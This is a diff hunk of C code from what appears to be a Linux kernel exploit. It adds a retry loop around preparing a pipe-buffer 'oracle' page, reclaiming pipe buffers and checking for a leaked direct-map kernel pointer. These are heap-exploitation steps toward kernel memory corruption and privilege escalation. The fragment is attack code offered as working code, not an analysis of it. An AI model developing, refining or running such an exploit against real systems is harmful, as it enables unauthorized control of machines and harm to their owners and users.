@@ -1149,16 +1149,31 @@ int prepare_p0_pipe_oracle(void) {
   _Static_assert(sizeof(struct user_pipe_buffer) == 0x28,
                  "unexpected pipe_buffer size");
 
+#ifdef P0_PIPE_PREPARE_ATTEMPTS
+  const int pipe_prepare_attempts = P0_PIPE_PREPARE_ATTEMPTS;
+#else
+  const int pipe_prepare_attempts = 1;
+#endif
   for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
     p0_gate_holders[pipe_index][0] = -1;
     p0_gate_holders[pipe_index][1] = -1;
   }
-  p0_gate_holders_initialized = 1;
-
-  pipebuf_page_base = prepare_pipe_buffer_page();
+  pipebuf_page_base = 0;
+  for (int attempt = 1; attempt <= pipe_prepare_attempts; attempt++) {
+    if (attempt != 1) {
+      reset_pipe_attempt();
+    }
+    pipebuf_page_base = prepare_pipe_buffer_page();
+    pr_info("p0 pipe page attempt=%d/%d base=%016zx\n", attempt,
+            pipe_prepare_attempts, pipebuf_page_base);
+    if (is_direct_ptr(pipebuf_page_base)) {
+      break;
+    }
+  }
   if (!is_direct_ptr(pipebuf_page_base)) {
     return 0;
   }
+  p0_gate_holders_initialized = 1;
 
   unsigned char marker[PAGE_SIZE];
   memset(marker, 0x5a, sizeof(marker));
